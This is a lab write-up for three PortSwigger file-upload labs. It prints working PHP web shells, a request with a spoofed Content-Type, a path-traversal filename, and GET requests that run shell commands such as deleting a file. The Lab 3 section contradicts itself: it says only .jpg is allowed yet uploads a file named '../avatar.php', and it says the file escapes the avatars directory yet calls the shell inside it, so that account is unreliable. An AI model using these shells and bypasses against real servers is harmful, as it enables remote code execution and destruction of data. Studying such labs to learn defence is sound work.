# File Upload Vulnerabilities: From Weak Validation to Remote Code Execution

## Platform
PortSwigger Web Security Academy

## Difficulty
Apprentice

## Vulnerability Category
Unrestricted File Upload / Remote Code Execution (CWE-434)

## Lab Objective
All three labs share a common exploitation chain: find an avatar/image upload feature, smuggle a server-side script past whatever check is in place, and get the application to execute it. Once a web shell runs, the final step in each lab is always the same — invoke it to delete the file `/home/carlos/secret`.

| # | Lab | Defence Bypassed | Level |
|---|-----|------------------|-------|
| 1 | Remote code execution via web shell upload | No validation at all | Apprentice |
| 2 | Web shell upload via Content-Type restriction bypass | `Content-Type` MIME check | Apprentice |
| 3 | Web shell upload via path traversal | Filename reused, no path sanitisation | Apprentice |

## Vulnerability Overview
A file upload feature is dangerous whenever three conditions line up: the server accepts a file with attacker-controlled content, stores it somewhere reachable over HTTP, and that location is interpreted by the server as executable code (e.g. a `.php` file under the webroot on a PHP-enabled server). If any validation present (extension check, MIME-type check, filename handling) can be bypassed, the result is arbitrary remote code execution — one of the most severe web vulnerability classes, since the attacker gets a direct command execution primitive rather than just data disclosure.

The three labs isolate three distinct, commonly-seen mistakes:
- **No validation** — trusting the client entirely.
- **Client-supplied `Content-Type` trusted** — validating a header the attacker controls, instead of the actual file content.
- **Filename trusted for path construction** — allowing path traversal sequences inside the uploaded filename, letting the attacker choose *where* the file lands, independent of the extension check.

## Methodology
1. **Reconnaissance.** Log in to the application (`wiener:peter`) and locate the avatar upload feature under "My Account." Proxy the request through Burp Suite.
2. **Baseline.** Upload a legitimate image and observe the request structure (multipart form, `Content-Type`, field names) and where the file is served from afterward.
3. **Prepare a web shell.** A minimal PHP web shell is enough:

```php
<?php echo file_get_contents('/etc/passwd'); ?>
```

For destructive labs, a command-execution shell is used instead:

```php
<?php echo system($_GET['cmd']); ?>
```

4. **Send the upload to Repeater** and modify the request to bypass whatever check is in place.
5. **Locate the uploaded file.** The response or the avatar `<img>` tag on the account page typically reveals the storage path, commonly `/files/avatars/<filename>`.
6. **Trigger execution.** Browse to the uploaded file directly; if the server executes it as PHP rather than serving it as static content, the shell runs.
7. **Use the shell to complete the objective**, e.g.:

```
GET /files/avatars/shell.php?cmd=rm+/home/carlos/secret
```

---

## Lab 01: Remote Code Execution via Web Shell Upload

**Defence:** none — the server accepts any file type and stores it under a predictable, web-accessible path.

### Exploitation

**Step 1:** Upload the PHP web shell as the avatar through the normal upload form, named `shell.php`:

```php
<?php echo system($_GET['cmd']); ?>
```

**Step 2:** Submit the form and note the response — it confirms the upload succeeded and discloses the storage path (`/files/avatars/shell.php`).

**Step 3:** Browse to the shell with a command:

```
GET /files/avatars/shell.php?cmd=id
```

The response shows command output, confirming code execution.

**Step 4:** Finish the objective:

```
GET /files/avatars/shell.php?cmd=rm+/home/carlos/secret
```

**Why it works:** The application performs zero validation of file type, content, or extension, and the upload directory is both web-accessible and configured to execute PHP. Any one of those three properties being absent would have blocked the attack — this lab shows the baseline case where none of them are addressed.

---

## Lab 02: Web Shell Upload via Content-Type Restriction Bypass

**Defence:** the server rejects uploads unless the `Content-Type` header matches an image type (e.g. `image/jpeg`).

**Analysis:** Uploading `shell.php` directly is rejected. The check inspects the `Content-Type` field of the multipart form part — a value the client sets and fully controls. This is a classic blacklist/allowlist-on-the-wrong-signal mistake: the server validates metadata about the file instead of the file itself.

### Exploitation

**Step 1:** Attempt the plain PHP upload — confirm it is rejected ("invalid file type").

**Step 2:** Resend the request in Repeater and alter the `Content-Type` of the file part to a permitted image type, while keeping the malicious PHP content and `.php` extension unchanged:

```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo system($_GET['cmd']); ?>
```

**Step 3:** The upload is now accepted, since the server only checked the header.

**Step 4:** Execute and complete the objective exactly as in Lab 1:

```
GET /files/avatars/shell.php?cmd=rm+/home/carlos/secret
```

**Why it works:** `Content-Type` is attacker-controlled metadata, not a property of the file itself. A server that infers file type from this header rather than inspecting actual content or restricting by validated extension is trivially bypassed by lying in the request.

---

## Lab 03: Web Shell Upload via Path Traversal

**Defence:** the server allows only `.jpg` files by extension, but reuses the user-controlled filename when storing the file, with no path sanitisation.

**Analysis:** With the extension locked to `.jpg`, a direct PHP upload is impossible. However, the application already has a known-executable PHP file on the server: the user's own `avatar.php`, served from a path like `/files/avatars/<username>.jpg` or similar, often alongside the application's own `avatar.php` handler that it uses to render avatars. The real target is the **filename field** — if it's taken from the multipart form and used unsanitised, traversal sequences can redirect where the "legitimate" `.jpg` file is written.

The specific path exploited in this lab is overwriting the application's own `avatar.php` (the script responsible for displaying avatars) with attacker-controlled PHP content, by traversing out of the avatars directory and back into the directory containing it.

### Exploitation

**Step 1:** Upload a file with a valid `.jpg` extension so the content-type/extension check passes, but set the **filename** in the multipart form to a path traversal sequence targeting the existing `avatar.php`:

```http
Content-Disposition: form-data; name="avatar"; filename="../avatar.php"
Content-Type: image/jpeg

<?php echo system($_GET['cmd']); ?>
```

**Step 2:** The server passes the extension check against the `Content-Type`/display logic but writes the file using the traversal path, overwriting the real `avatar.php` with the malicious payload.

**Step 3:** Request the now-overwritten script directly:

```
GET /files/avatars/avatar.php?cmd=rm+/home/carlos/secret
```

**Step 4:** The command executes and the lab is solved.

**Why it works:** Extension validation and filename-based path construction are two separate concerns, and this lab validates only the first. The filename is still attacker-supplied raw input used to build a filesystem path — a path traversal vulnerability on top of an upload feature, letting the attacker choose the destination file regardless of what content-type gate exists.

---

## Impact
- **Full remote code execution** on the application server — the most severe outcome short of host compromise.
- **Complete confidentiality, integrity, and availability loss**: an attacker with a web shell can read, modify, or delete any file the web server process can access, pivot to internal systems, or install persistence.
- **Escalation potential**: RCE via file upload is frequently the first foothold in real-world breaches, often chained with privilege escalation to gain full server control.

## Remediation
- **Validate file content, not metadata.** Check actual file signatures/magic bytes server-side; never trust `Content-Type` or the client-supplied filename.
- **Use an extension allowlist enforced server-side**, combined with content verification (e.g. re-encoding images server-side strips any embedded payload).
- **Generate filenames server-side.** Never reuse user-supplied filenames for storage — assign a random name/UUID and store the original name only as metadata.
- **Store uploads outside the webroot**, or in a location explicitly configured to never execute scripts (e.g. `php_admin_flag engine off` for that directory, or serving from a separate static-only domain/CDN).
- **Principle of least privilege:** the web server process should have minimal filesystem write access, and certainly should not be able to overwrite its own application code.

## Key Takeaways
- Any single validation layer (extension, MIME type, or filename) is insufficient in isolation — defence in depth is required.
- Client-supplied metadata (`Content-Type`, filename) is never a trustworthy security control.
- Upload features that let the attacker influence the *destination path*, not just the *content*, open an additional path traversal attack surface layered on top of the file-type check.
- A single overwritable, web-accessible PHP file anywhere in the application is sufficient for full compromise.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents intentionally vulnerable labs on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.